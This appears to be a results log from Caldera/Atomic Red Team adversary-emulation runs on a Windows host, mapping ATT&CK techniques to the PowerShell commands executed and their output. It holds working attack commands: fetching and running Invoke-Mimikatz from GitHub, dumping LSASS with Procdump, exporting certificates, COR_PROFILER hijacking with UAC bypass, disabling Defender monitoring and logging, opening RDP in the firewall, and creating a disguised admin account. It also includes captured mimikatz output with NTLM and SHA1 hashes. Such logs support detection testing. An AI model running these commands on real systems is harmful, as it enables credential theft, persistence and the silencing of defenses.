WebClient                             Stopped  Wecsvc             Windows Event Collector               Stopped  WEPHOSTSVC         Windows Encryption Provider Host Se...Stopped  wercplsupport      Problem Reports Control Panel Support Stopped  WerSvc             Windows Error Reporting Service       Stopped  WFDSConMgrSvc      Wi-Fi Direct Services Connection Ma...Stopped  WiaRpc             Still Image Acquisition Events        Running  WinDefend          Microsoft Defender Antivirus Service  Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...Running  Winmgmt            Windows Management Instrumentation    Stopped  WinRM              Windows Remote Management (WS-Manag...Running  wisvc              Windows Insider Service               Stopped  WlanSvc            WLAN AutoConfig                       Running  wlidsvc            Microsoft Account Sign-in Assistant   Stopped  wlpasvc            Local Profile Assistant Service       Stopped  WManSvc            Windows Management Service            Stopped  wmiApSrv           WMI Performance Adapter               Stopped  WMPNetworkSvc      Windows Media Player Network Sharin...Stopped  workfolderssvc     Work Folders                          Stopped  WpcMonSvc          Parental Controls                     Stopped  WPDBusEnum         Portable Device Enumerator Service    Running  WpnService         Windows Push Notifications System S...Running  WpnUserService_... Windows Push Notifications User Ser...Running  wscsvc             Security Center                       Running  WSearch            Windows Search                        Running  wuauserv           Windows Update                        Stopped  WwanSvc            WWAN AutoConfig                       Stopped  XblAuthManager     Xbox Live Auth Manager                Stopped  XblGameSave        Xbox Live Game Save                   Stopped  XboxGipSvc         Xbox Accessory Management Service     Stopped  XboxNetApiSvc      Xbox Live Networking Service          '],[''],['0'],['Get-Service'],['Identify system services'],['Discover system services'],"[{'tactic': 'discovery', 'technique_name': 'System Service Discovery', 'technique_id': 'T1007'}]",['windows'],['psh']
68,Initial-Success,collection,collection :: Data from Local System,collection :: ['Find Git Repositories'],collection :: T1005,operation__stockpile_windows_depfalse_pshtrue__t1005__collection__data_from_local_system__720a3356-eee1-4015-9135-0fc08f7eb2d5__SAVED_2024-03-09_142432,stockpile_windows_depfalse_pshtrue__t1005__collection__data_from_local_system__720a3356-eee1-4015-9135-0fc08f7eb2d5,['720a3356-eee1-4015-9135-0fc08f7eb2d5'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Get-ChildItem C:\\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter "".git"" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;']",['This ability will locate directories that are cloned Git repositories.'],['Find Git Repositories'],"[{'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}]",['windows'],['psh']
70,Initial-Success,credential-access,credential-access :: OS Credential Dumping: LSASS Memory,credential-access :: ['Run PowerKatz'],credential-access :: T1003.001,operation__stockpile_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__baac2c6d-4652-4b7e-ab0a-f1bf246edd12__SAVED_2024-03-09_141537,stockpile_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__baac2c6d-4652-4b7e-ab0a-f1bf246edd12,['baac2c6d-4652-4b7e-ab0a-f1bf246edd12'],1,1,1,[0],"['  .#####.   mimikatz 2.1.1 (x64) #17763 Dec 31 2018 01:15:11 .## ^ ##.  ""A La Vie, A L\'Amour"" - (oe.eo) ** Kitten Edition ** ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz \'## v ##\'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  \'#####\'        > http://pingcastle.com / http://mysmartlogon.com   ***/mimikatz(powershell) # sekurlsa::logonpasswordsERROR kuhl_m_sekurlsa_acquireLSA ; Logon listmimikatz(powershell) # exitBye!']",[''],['0'],"['[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };$web = (New-Object System.Net.WebClient);$result = $web.DownloadString(""https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1"");iex $result; Invoke-Mimikatz -DumpCreds']",['Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords'],['Run PowerKatz'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping: LSASS Memory', 'technique_id': 'T1003.001'}]",['windows'],['psh']
71,Initial-Success,credential-access,credential-access :: OS Credential Dumping: LSASS Memory,credential-access :: ['Powerkatz (Staged)'],credential-access :: T1003.001,operation__stockpile_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__7049e3ec-b822-4fdf-a4ac-18190f9b66d1__SAVED_2024-03-09_140643,stockpile_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__7049e3ec-b822-4fdf-a4ac-18190f9b66d1,['7049e3ec-b822-4fdf-a4ac-18190f9b66d1'],1,1,1,[0],"['  .#####.   mimikatz 2.2.0 (x64) #19041 Jun 16 2020 13:40:08 .## ^ ##.  ""A La Vie, A L\'Amour"" - (oe.eo) ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz \'## v ##\'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  \'#####\'        > http://pingcastle.com / http://mysmartlogon.com   ***/mimikatz(powershell) # sekurlsa::logonpasswordsAuthentication Id : 0 ; 253363 (00000000:0003ddb3)Session           : Interactive from 1User Name         : puma-4Domain            : DESKTOP-9LD827ILogon Server      : DESKTOP-9LD827ILogon Time        : 3/8/2024 12:44:33 PMSID               : S-1-5-21-2334472832-2587113924-773976260-1001\tmsv :\t\t [00000003] Primary\t * Username : puma-4\t * Domain   : .\t * NTLM     : 4713984be0a9c3038e4bd6b01e3a2f80\t * SHA1     : 84e755f7536c91eaeecef494c468a1aab27fa2fc\t * DPAPI    : 84e755f7536c91eaeecef494c468a1aa\ttspkg :\t\twdigest :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tkerberos :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tssp :\t\tcredman :\tAuthentication Id : 0 ; 253321 (00000000:0003dd89)Session           : Interactive from 1User Name         : puma-4Domain            : DESKTOP-9LD827ILogon Server      : DESKTOP-9LD827ILogon Time        : 3/8/2024 12:44:33 PMSID               : S-1-5-21-2334472832-2587113924-773976260-1001\tmsv :\t\t [00000003] Primary\t * Username : puma-4\t * Domain   : .\t * NTLM     : 4713984be0a9c3038e4bd6b01e3a2f80\t * SHA1     : 84e755f7536c91eaeecef494c468a1aab27fa2fc\t * DPAPI    : 84e755f7536c91eaeecef494c468a1aa\ttspkg :\t\twdigest :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tkerberos :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tssp :\t\tcredman :\tAuthentication Id : 0 ; 73649 (00000000:00011fb1)Session           : Batch from 0User Name         : puma-4Domain            : DESKTOP-9LD827ILogon Server      : DESKTOP-9LD827ILogon Time        : 3/8/2024 12:44:31 PMSID               : S-1-5-21-2334472832-2587113924-773976260-1001\tmsv :\t\t [00000003] Primary\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * NTLM     : 4713984be0a9c3038e4bd6b01e3a2f80\t * SHA1     : 84e755f7536c91eaeecef494c468a1aab27fa2fc\t * DPAPI    : 84e755f7536c91eaeecef494c468a1aa\ttspkg :\t\twdigest :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tkerberos :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tssp :\t\tcredman :\tAuthentication Id : 0 ; 997 (00000000:000003e5)Session           : Service from 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 3/8/2024 12:44:31 PMSID               : S-1-5-19\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : (null)\t * Domain   : (null)\t * Password : (null)\tkerberos :\t\t * Username : (null)\t * Domain   : (null)\t * Password : (null)\tssp :\t\tcredman :\tAuthentication Id : 0 ; 54154 (00000000:0000d38a)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 3/8/2024 12:44:31 PMSID               : S-1-5-90-0-1\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\t\tcredman :\tAuthentication Id : 0 ; 54091 (00000000:0000d34b)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 3/8/2024 12:44:31 PMSID               : S-1-5-90-0-1\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\t\tcredman :\tAuthentication Id : 0 ; 996 (00000000:000003e4)Session           : Service from 0User Name         : DESKTOP-9LD827I$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 3/8/2024 12:44:31 PMSID               : S-1-5-20\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\t * Username : desktop-9ld827i$\t * Domain   : WORKGROUP\t * Password : (null)\tssp :\t\tcredman :\tAuthentication Id : 0 ; 32555 (00000000:00007f2b)Session           : Interactive from 1User Name         : UMFD-1Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 3/8/2024 12:44:31 PMSID               : S-1-5-96-0-1\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\t\tcredman :\tAuthentication Id : 0 ; 32512 (00000000:00007f00)Session           : Interactive from 0User Name         : UMFD-0Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 3/8/2024 12:44:31 PMSID               : S-1-5-96-0-0\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\t\tcredman :\tAuthentication Id : 0 ; 30299 (00000000:0000765b)Session           : UndefinedLogonType from 0User Name         : (null)Domain            : (null)Logon Server      : (null)Logon Time        : 3/8/2024 12:44:31 PMSID               : \tmsv :\t\ttspkg :\t\twdigest :\t\tkerberos :\t\tssp :\t\tcredman :\tAuthentication Id : 0 ; 999 (00000000:000003e7)Session           : UndefinedLogonType from 0User Name         : DESKTOP-9LD827I$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 3/8/2024 12:44:31 PMSID               : S-1-5-18\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\t * Username : desktop-9ld827i$\t * Domain   : WORKGROUP\t * Password : (null)\tssp :\t\tcredman :\tmimikatz(powershell) # exitBye!']",[''],['0'],['Import-Module .\\invoke-mimi.ps1;Invoke-Mimikatz -DumpCreds'],['Use Invoke-Mimikatz'],['Powerkatz (Staged)'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping: LSASS Memory', 'technique_id': 'T1003.001'}]",['windows'],['psh']
72,Initial-Success,credential-access,credential-access :: OS Credential Dumping: LSASS Memory,credential-access :: ['Leverage Procdump for lsass memory'],credential-access :: T1003.001,operation__stockpile_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__0ef4cc7b-611c-4237-b20b-db36b6906554__SAVED_2024-03-09_135746,stockpile_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__0ef4cc7b-611c-4237-b20b-db36b6906554,['0ef4cc7b-611c-4237-b20b-db36b6906554'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$ps_url = ""https://download.sysinternals.com/files/Procdump.zip"";$download_folder = ""C:\\Users\\Public\\"";$staging_folder = ""C:\\Users\\Public\\temp"";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder""Procdump.zip"" -DestinationPath $staging_folder;$arch=[System.Environment]::Is64BitOperatingSystem;if ($arch) {    iex $staging_folder""\\procdump64.exe -accepteula -ma lsass.exe"" > $env:APPDATA\\error.dmp 2>&1;} else {    iex $staging_folder""\\procdump.exe -accepteula -ma lsass.exe"" > $env:APPDATA\\error.dmp 2>&1;}remove-item $staging_folder -Recurse;']",['Dump lsass for later use with mimikatz'],['Leverage Procdump for lsass memory'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping: LSASS Memory', 'technique_id': 'T1003.001'}]",['windows'],['psh']
73,Initial-Success,credential-access,credential-access :: Steal or Forge Authentication Certificates,credential-access :: ['Staging Local Certificates via Export-Certificate'],credential-access :: T1649,operation__atomic_windows_depfalse_pshtrue__t1649__credential-access__steal_or_forge_authentication_certificates__b41910e3770cff37dd642650f0d91672__SAVED_2024-03-09_134853,atomic_windows_depfalse_pshtrue__t1649__credential-access__steal_or_forge_authentication_certificates__b41910e3770cff37dd642650f0d91672,['b41910e3770cff37dd642650f0d91672'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$archive=""$env:PUBLIC\\T1649\\atomic_certs.zip""; $exfilpath=""$env:PUBLIC\\T1649\\certs""; Add-Type -assembly ""system.io.compression.filesystem""; Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore; mkdir $exfilpath | Out-Null; foreach ($cert in (gci Cert:\\CurrentUser\\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\\$($cert.FriendlyName).cer}; [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)']",['Export all user certificates and add to a compressed archive.\n'],['Staging Local Certificates via Export-Certificate'],"[{'tactic': 'credential-access', 'technique_name': 'Steal or Forge Authentication Certificates', 'technique_id': 'T1649'}]",['windows'],['psh']
78,Initial-Success,reconnaissance,reconnaissance :: Gather Victim Host Information: Hardware,reconnaissance :: ['Enumerate PlugNPlay Camera'],reconnaissance :: T1592.001,operation__atomic_windows_depfalse_pshtrue__t1592_001__reconnaissance__gather_victim_host_information-_hardware__53861bc51eb67cb9775c95b9e02ad141__SAVED_2024-03-09_125524,atomic_windows_depfalse_pshtrue__t1592_001__reconnaissance__gather_victim_host_information-_hardware__53861bc51eb67cb9775c95b9e02ad141,['53861bc51eb67cb9775c95b9e02ad141'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Get-CimInstance -Query ""SELECT * FROM Win32_PnPEntity WHERE (PNPClass = \'Image\' OR PNPClass = \'Camera\')""']",['Enumerate PlugNPlay Camera using powershell commandlet. this technique was seen in dcrat malware backdoor capabilities where it enumerate the camera info mounted on the compromised host. reference: https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor\n'],['Enumerate PlugNPlay Camera'],"[{'tactic': 'reconnaissance', 'technique_name': 'Gather Victim Host Information: Hardware', 'technique_id': 'T1592.001'}]",['windows'],['psh']
79,Initial-Success,multiple,multiple :: Hijack Execution Flow: COR_PROFILER,multiple :: ['Registry-free process scope COR_PROFILER'],multiple :: T1574.012,operation__atomic_windows_depfalse_pshtrue__t1574_012__multiple__hijack_execution_flow-_cor_profiler__7179bb4957f1f7f3004ea70c714a8fb9__SAVED_2024-03-09_124628,atomic_windows_depfalse_pshtrue__t1574_012__multiple__hijack_execution_flow-_cor_profiler__7179bb4957f1f7f3004ea70c714a8fb9,['7179bb4957f1f7f3004ea70c714a8fb9'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$env:COR_ENABLE_PROFILING = 1; $env:COR_PROFILER = \'{09108e71-974c-4010-89cb-acf471ae9e2c}\'; $env:COR_PROFILER_PATH = \'""83f016_T1574.012x64.dll""\'; POWERSHELL -c \'Start-Sleep 1\'']",['Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n'],['Registry-free process scope COR_PROFILER'],"[{'tactic': 'multiple', 'technique_name': 'Hijack Execution Flow: COR_PROFILER', 'technique_id': 'T1574.012'}]",['windows'],['psh']
80,Initial-Success,multiple,multiple :: Hijack Execution Flow: COR_PROFILER,multiple :: ['System Scope COR_PROFILER'],multiple :: T1574.012,operation__atomic_windows_depfalse_pshtrue__t1574_012__multiple__hijack_execution_flow-_cor_profiler__44c554d9bf01759c8a35c8ec8eb8510d__SAVED_2024-03-09_123738,atomic_windows_depfalse_pshtrue__t1574_012__multiple__hijack_execution_flow-_cor_profiler__44c554d9bf01759c8a35c8ec8eb8510d,['44c554d9bf01759c8a35c8ec8eb8510d'],1,0,1,[1],['Creating system environment variables'],[''],['0'],"['Write-Host ""Creating system environment variables"" -ForegroundColor Cyan; New-ItemProperty -Path \'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\' -Name ""COR_ENABLE_PROFILING"" -PropertyType String -Value ""1"" -Force | Out-Null; New-ItemProperty -Path \'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\' -Name ""COR_PROFILER"" -PropertyType String -Value ""{09108e71-974c-4010-89cb-acf471ae9e2c}"" -Force | Out-Null; New-ItemProperty -Path \'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\' -Name ""COR_PROFILER_PATH"" -PropertyType String -Value ""83f016_T1574.012x64.dll"" -Force | Out-Null']","['Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n']",['System Scope COR_PROFILER'],"[{'tactic': 'multiple', 'technique_name': 'Hijack Execution Flow: COR_PROFILER', 'technique_id': 'T1574.012'}]",['windows'],['psh']
81,Initial-Success,multiple,multiple :: Hijack Execution Flow: COR_PROFILER,multiple :: ['User scope COR_PROFILER'],multiple :: T1574.012,operation__atomic_windows_depfalse_pshtrue__t1574_012__multiple__hijack_execution_flow-_cor_profiler__07b384a102f27412c1475421f4534f29__SAVED_2024-03-09_122841,atomic_windows_depfalse_pshtrue__t1574_012__multiple__hijack_execution_flow-_cor_profiler__07b384a102f27412c1475421f4534f29,['07b384a102f27412c1475421f4534f29'],1,0,1,[1],['Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}executing eventvwr.msc'],[''],['0'],"['Write-Host ""Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}"" -ForegroundColor Cyan; New-Item -Path ""HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32"" -Value ""83f016_T1574.012x64.dll"" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name ""COR_ENABLE_PROFILING"" -PropertyType String -Value ""1"" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name ""COR_PROFILER"" -PropertyType String -Value ""{09108e71-974c-4010-89cb-acf471ae9e2c}"" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name ""COR_PROFILER_PATH"" -PropertyType String -Value ""83f016_T1574.012x64.dll"" -Force | Out-Null; Write-Host ""executing eventvwr.msc"" -ForegroundColor Cyan; START MMC.EXE EVENTVWR.MSC']","['Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n']",['User scope COR_PROFILER'],"[{'tactic': 'multiple', 'technique_name': 'Hijack Execution Flow: COR_PROFILER', 'technique_id': 'T1574.012'}]",['windows'],['psh']
94,Initial-Success,initial-access,initial-access :: Phishing: Spearphishing Attachment,initial-access :: ['Word spawned a command shell and used an IP address in the command line'],initial-access :: T1566.001,operation__atomic_windows_depfalse_pshtrue__t1566_001__initial-access__phishing-_spearphishing_attachment__1afaec09315ab71fdfb167175e8a019a__SAVED_2024-03-09_102404,atomic_windows_depfalse_pshtrue__t1566_001__initial-access__phishing-_spearphishing_attachment__1afaec09315ab71fdfb167175e8a019a,['1afaec09315ab71fdfb167175e8a019a'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"[""$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm""]","['This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.\nThe file ""PhishingAttachment.xlsm"" is downloaded to the %temp% directory.\n']",['Download Macro-Enabled Phishing Attachment'],"[{'tactic': 'initial-access', 'technique_name': 'Phishing: Spearphishing Attachment', 'technique_id': 'T1566.001'}]",['windows'],['psh']
97,Initial-Success,defense-evasion,defense-evasion :: Run Virtual Instance,defense-evasion :: ['Create and start Hyper-V virtual machine'],defense-evasion :: T1564.006,operation__atomic_windows_depfalse_pshtrue__t1564__defense-evasion__hide_artifacts__83a5ad479c9e313e60f34380e193102a__SAVED_2024-03-09_095713,atomic_windows_depfalse_pshtrue__t1564__defense-evasion__hide_artifacts__83a5ad479c9e313e60f34380e193102a,['83a5ad479c9e313e60f34380e193102a'],1,0,1,[1],['Name           Enabled Description----           ------- -----------Administrator  True               '],[''],['0'],"['New-LocalUser -Name ""Administrator "" -NoPassword']",['Creating a user with a username containing with a space on the end'],"['Create an ""Administrator "" user (with a space on the end)']","[{'tactic': 'defense-evasion', 'technique_name': 'Hide Artifacts', 'technique_id': 'T1564'}]",['windows'],['psh']
100,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Indicator Blocking,defense-evasion :: ['LockBit Black - Disable the ETW Provider of Windows Defender -Powershell'],defense-evasion :: T1562.006,operation__atomic_windows_depfalse_pshtrue__t1564_003__defense-evasion__hide_artifacts-_hidden_window__f1222384fe40cc71e7dea9d182014eaf__SAVED_2024-03-09_091314,atomic_windows_depfalse_pshtrue__t1564_003__defense-evasion__hide_artifacts-_hidden_window__f1222384fe40cc71e7dea9d182014eaf,['f1222384fe40cc71e7dea9d182014eaf'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Start-Process powershell.exe -WindowStyle hidden calc.exe'],"['Launch PowerShell with the ""-WindowStyle Hidden"" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\nUpon execution a hidden PowerShell window will launch calc.exe\n']",['Hidden Window'],"[{'tactic': 'defense-evasion', 'technique_name': 'Hide Artifacts: Hidden Window', 'technique_id': 'T1564.003'}]",['windows'],['psh']
101,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Indicator Blocking,defense-evasion :: ['Disable .NET Event Tracing for Windows Via Registry (powershell)'],defense-evasion :: T1562.006,operation__atomic_windows_depfalse_pshtrue__t1562_006__defense-evasion__impair_defenses-_indicator_blocking__54ef63765cf80243f370958bcf738338__SAVED_2024-03-09_085537,atomic_windows_depfalse_pshtrue__t1562_006__defense-evasion__impair_defenses-_indicator_blocking__54ef63765cf80243f370958bcf738338,['54ef63765cf80243f370958bcf738338'],1,0,1,[1],['Enabled      : 0PSPath       : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\               Channels\\Microsoft-Windows-Windows Defender\\OperationalPSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\               ChannelsPSChildName  : Microsoft-Windows-Windows Defender/OperationalPSDrive      : HKLMPSProvider   : Microsoft.PowerShell.Core\\Registry'],[''],['0'],"['New-ItemProperty ""HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled  -PropertyType DWord -Value 0 -Force']","['An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n']",['LockBit Black - Disable the ETW Provider of Windows Defender -Powershell'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Indicator Blocking', 'technique_id': 'T1562.006'}]",['windows'],['psh']
104,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify System Firewall,defense-evasion :: ['Allow Executable Through Firewall Located in Non-Standard Location'],defense-evasion :: T1562.004,operation__atomic_windows_depfalse_pshtrue__t1562_004__defense-evasion__impair_defenses-_disable_or_modify_system_firewall__9378f5d52c7f94cd08f407f8c0a5fbd7__SAVED_2024-03-09_082905,atomic_windows_depfalse_pshtrue__t1562_004__defense-evasion__impair_defenses-_disable_or_modify_system_firewall__9378f5d52c7f94cd08f407f8c0a5fbd7,['9378f5d52c7f94cd08f407f8c0a5fbd7'],1,1,1,[0],['Ok.'],[''],['0'],"['netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=3389 action=allow profile=any']",['This test will attempt to open a local port defined by input arguments to any profile'],['Open a local port through Windows Firewall to any profile'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify System Firewall', 'technique_id': 'T1562.004'}]",['windows'],['psh']
105,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable Windows Event Logging,defense-evasion :: ['Disable Windows IIS HTTP Logging'],defense-evasion :: T1562.002,operation__atomic_windows_depfalse_pshtrue__t1562_004__defense-evasion__impair_defenses-_disable_or_modify_system_firewall__34f398de2b04b96158b3bd25abaea5a7__SAVED_2024-03-09_082017,atomic_windows_depfalse_pshtrue__t1562_004__defense-evasion__impair_defenses-_disable_or_modify_system_firewall__34f398de2b04b96158b3bd25abaea5a7,['34f398de2b04b96158b3bd25abaea5a7'],1,1,1,[0],['Ok.'],[''],['0'],"['Copy-Item ""f7ce09_AtomicTest.exe"" -Destination ""C:\\Users\\$env:UserName"" -Force; netsh advfirewall firewall add rule name=""Atomic Test"" dir=in action=allow program=""C:\\Users\\$env:UserName\\AtomicTest.exe"" enable=yes']",['This test will attempt to allow an executable through the system firewall located in the Users directory'],['Allow Executable Through Firewall Located in Non-Standard Location'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify System Firewall', 'technique_id': 'T1562.004'}]",['windows'],['psh']
110,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['Tamper with Windows Defender Evade Scanning -Extension'],defense-evasion :: T1562.001,operation__atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__f0fde90a3d59061b226197974e7dcbaa__SAVED_2024-03-09_073607,atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__f0fde90a3d59061b226197974e7dcbaa,['f0fde90a3d59061b226197974e7dcbaa'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableBlockAtFirstSeen 1'],['Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n'],['Tamper with Windows Defender ATP PowerShell'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
